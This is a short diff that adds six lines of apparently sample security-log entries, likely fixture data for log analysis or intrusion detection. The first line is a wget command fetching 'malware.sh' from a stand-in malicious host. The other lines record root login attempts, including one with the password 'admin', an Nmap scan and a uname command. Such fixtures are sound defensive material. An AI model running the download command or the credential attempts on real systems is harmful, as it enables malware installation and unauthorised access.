@@ -1,0 +1,6 @@
+wget http://malicious.site/malware.sh
+Failed login attempt for root from 10.0.0.5
+Nmap scan detected on port 22
+Executed command: uname -a
+External IP attempted login as root with password 'admin'
+
